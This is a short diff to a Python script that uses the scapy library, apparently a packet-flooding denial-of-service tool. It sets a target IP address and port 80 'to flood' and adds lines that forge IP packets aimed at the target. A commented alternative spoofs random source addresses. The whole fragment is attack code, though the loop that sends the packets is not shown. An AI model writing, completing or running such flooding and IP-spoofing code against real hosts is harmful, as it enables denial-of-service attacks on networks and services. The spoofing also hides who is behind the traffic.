@@ -5,3 +5,8 @@ from scapy.all import *
 target_ip = "192.168.1.1"
 # the target port u want to flood
 target_port = 80
+
+# forge IP packet with target ip as the destination IP address
+ip = IP(dst=target_ip)
+# or if you want to perform IP Spoofing (will work as well)
+# ip = IP(src=RandIP("192.168.1.1/24"), dst=target_ip)
